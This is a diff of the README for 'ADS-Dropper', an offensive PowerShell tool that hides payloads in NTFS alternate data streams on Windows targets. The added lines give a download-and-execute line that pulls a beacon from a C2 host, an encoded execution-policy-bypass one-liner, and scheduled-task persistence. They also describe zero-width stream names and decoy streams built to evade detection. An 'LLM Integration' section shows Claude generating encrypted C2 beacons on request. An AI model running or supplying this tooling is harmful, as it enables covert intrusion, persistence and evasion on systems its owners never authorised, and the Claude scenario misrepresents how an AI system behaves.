@@ -6,7 +6,7 @@
 .       _    ___   ___   _     ___    ___ _____  _   ___  _  _       .
        /_\   | _ \| _ \ /_\   | __ \ |_ _|_   _|| | / _ \| \| |
       / _ \  |  _/|  _// _ \  | |/ /  | |  | |  | || (_) | .` |
-     /_/ \_\ |_|  |_/ /_/ \_\_|_|\_| |___| |_|  |_| \___/|_|\_|
+     /_/ \_\ |_|  |_/ /_/ \_\ |_|\_| |___| |_|  |_| \___/|_|\_|
 : .    . .   . . ..  . .. . . .. . .. .. . .. ... . .. .    . . :
 .   .  .     . :     .    :  . : :   . : :    . :      .    .   .
    .   :      '  Apparition Delivery System (ADS) '      :    .
@@ -16,12 +16,12 @@
 
 If on linux, use the following to see some ASCII art:
 ```
-echo -e "\033[34m. : .  .  .. \033[36m... ...... ..................... ...... ... ..\033[34m .  . : .\n: .   .       .       \033[36m.        .        .        .\033[34m       .   . . :\n.       \033[36m_    ___   \033[96m___   _      ___    ___ _____  _    \033[36m___  _  _       \033[34m.\n       \033[36m/_\   | _ \| \033[97m_ \ /_\    | __ \ |_ _|_   _|| | \033[36m/ _ \| \| |\n      \033[36m/ _ \  |  _/| \033[97m _// _ \   | |/ /  | |  | |  | || \033[36m(_) | .\` |\n     \033[36m/_/ \_\ |_|  \033[97m|_/ /_/ \_\_|_|\_| |___| |_|  |_| \033[36m\___/|_|\_|\n\033[34m: .    . .   \033[36m. . ..  . .. . . .. . .. .. . .. ... . .. .\033[34m    . . :\n.   .  .     \033[36m. :     .    :  . : :   . : :    . :      .\033[34m    .   .\n   .   :      \033[36m'  \033[96mApparition Delivery System (ADS)\033[36m '      \033[34m:    .\n .  .  .   . . \033[36m' \033[96m\" Execution without presence \"\033[36m '\033[34m .    .   .  .\n    . .      . .. .. . ... .................. .. . .. .      . .\033[0m"
+echo -e "\033[34m. : .  .  .. \033[36m... ...... ..................... ...... ... ..\033[34m .  . : .\n: .   .       .       \033[36m.        .        .        .\033[34m       .   . . :\n.       \033[36m_    ___   \033[96m___   _      ___    ___ _____  _    \033[36m___  _  _       \033[34m.\n       \033[36m/_\   | _ \| \033[97m_ \ /_\    | __ \ |_ _|_   _|| | \033[36m/ _ \| \| |\n      \033[36m/ _ \  |  _/| \033[97m _// _ \   | |/ /  | |  | |  | || \033[36m(_) | .\` |\n     \033[36m/_/ \_\ |_|  \033[97m|_/ /_/ \_\  |_|\_| |___| |_|  |_| \033[36m\___/|_|\_|\n\033[34m: .    . .   \033[36m. . ..  . .. . . .. . .. .. . .. ... . .. .\033[34m    . . :\n.   .  .     \033[36m. :     .    :  . : :   . : :    . :      .\033[34m    .   .\n   .   :      \033[36m'  \033[96mApparition Delivery System (ADS)\033[36m '      \033[34m:    .\n .  .  .   . . \033[36m' \033[96m\" Execution without presence \"\033[36m '\033[34m .    .   .  .\n    . .      . .. .. . ... .................. .. . .. .      . .\033[0m"
 ```
 
 ---
 
-## Note: This tool passed some manual execution checks, but has not been tested for automation, in the wild, or for long-term reliability. I welcome fixes/improvements. Thank you for looking!
+## Note: This tool passed some manual execution checks in controlled VMs; it has not been tested for automation, in the wild, or for long-term reliability. I welcome fixes/improvements. Thank you for looking!
 
 ---
 
@@ -62,23 +62,138 @@ Windows execution techniques that exist, execute, and persist outside traditiona
 ---
 
 ## 🚀 Quickstart
-### Basic Deployment
-```powershell
-# Simple task persistence with encryption
-$payload = "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')"
-.\src\ADS-Dropper.ps1 -Payload $payload -Persist task -Encrypt
-```
-### Zero-Width Stealth Mode
-```powershell
-# Enhanced stealth with invisible stream names
-.\src\ADS-Dropper.ps1 -Payload $payload -Persist task -Encrypt -ZeroWidthStreams
 
-# Hybrid naming (legitimate prefix + zero-width suffix)
-.\src\ADS-Dropper.ps1 -Payload $payload -ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix 'Zone.Identifier'
+### **v2.0 Workflow: Generate on Linux, Deploy on Windows**
 
-# With decoy streams to complicate analysis
-.\src\ADS-Dropper.ps1 -Payload $payload -ZeroWidthStreams -CreateDecoys 3
+The recommended workflow uses **ADS-OneLiner.ps1** to generate minimal payloads on your attacker machine:
+
+#### **On Linux (Kali):**
+```bash
+# Generate encrypted payload with stealth features
+pwsh ./src/ADS-OneLiner.ps1 \
+  -Payload "IEX(New-Object Net.WebClient).DownloadString('http://c2/beacon.ps1')" \
+  -Encrypt \
+  -Randomize \
+  -ZeroWidthStreams \
+  -CreateDecoys 3 \
+  -OutputFile payload.txt
+
+# Manifest saved to ./manifests/ for recovery
 ```
+
+#### **On Windows Target:**
+```powershell
+# Copy OPTION 1 from payload.txt and paste:
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64_here>
+
+# Done! No file uploads needed.
+```
+
+### **Alternative: Direct Deployment (v1.0 method)**
+
+For local testing or when you have filesystem access:
+```powershell
+# Upload ADS-Dropper.ps1 to target, then run:
+.\ADS-Dropper.ps1 -Payload $payload -Persist task -Encrypt -Randomize
+```
+
+---
+
+## 🎯 Key Features
+
+### **Two-Script Architecture**
+- **ADS-Dropper.ps1**: Core engine (runs on Linux OR Windows)
+- **ADS-OneLiner.ps1**: Command generator (Linux only, generates Windows payloads)
+
+### **Deployment Methods**
+1. **Generate-and-Paste** (v2.0) - No file uploads, minimal footprint
+2. **Upload-and-Execute** (v1.0) - Traditional method, still supported
+
+### **LLM Integration**
+Could easily be added to tool calls and manifest output routed to payload tracking:
+```
+User: "Generate an encrypted C2 beacon for 10.0.0.50"
+Claude: [runs ADS-OneLiner.ps1, returns base64 one-liner]
+Manifest: Routed to LLM for payload recovery/tracking
+User: [pastes on Windows target]
+```
+
+### `-ZeroWidthStreams`
+
+Enable zero-width Unicode characters in stream names for enhanced stealth.
+
+Example:
+```powershell
+-ZeroWidthStreams
+```
+
+**How it works:**
+- Uses invisible Unicode characters (U+200B, U+200C, U+FEFF, etc.)
+- Stream names appear blank or truncated in most tools
+- Bypasses simple string-based detection
+
+---
+
+### `-ZeroWidthMode`
+
+Specifies how zero-width characters are used.  
+Options: `single`, `multi`, `hybrid`  
+Default: `single`
+
+**Modes:**
+
+1. **single** - One zero-width character
+```powershell
+   -ZeroWidthStreams -ZeroWidthMode single
+   # Stream: [invisible character]
+```
+
+2. **multi** - Multiple zero-width characters
+```powershell
+   -ZeroWidthStreams -ZeroWidthMode multi
+   # Stream: [3-5 invisible characters]
+```
+
+3. **hybrid** - Legitimate prefix + zero-width suffix
+```powershell
+   -ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix "Zone.Identifier"
+   # Stream: Zone.Identifier[invisible character]
+```
+
+---
+
+### `-HybridPrefix`
+
+Legitimate stream name to use as prefix in hybrid mode.
+
+Common prefixes:
+- `Zone.Identifier` (most common, created by browser downloads)
+- `Summary` (document metadata)
+- `Comments` (user annotations)
+
+Example:
+```powershell
+-ZeroWidthStreams -ZeroWidthMode hybrid -HybridPrefix "Zone.Identifier"
+```
+
+---
+
+### `-CreateDecoys`
+
+Number of benign decoy streams to create (0-10).
+
+Creates legitimate-looking streams to obscure the real payload:
+- `Zone.Identifier` - Download zone information
+- `Summary` - Document summary
+- `Comments` - File comments
+- `Author` - Author metadata
+
+Example:
+```powershell
+-CreateDecoys 3
+```
+
+**OPSEC Note:** Decoys add noise but increase forensic complexity.
 
 ### Multi-Target Deployment
 ```powershell
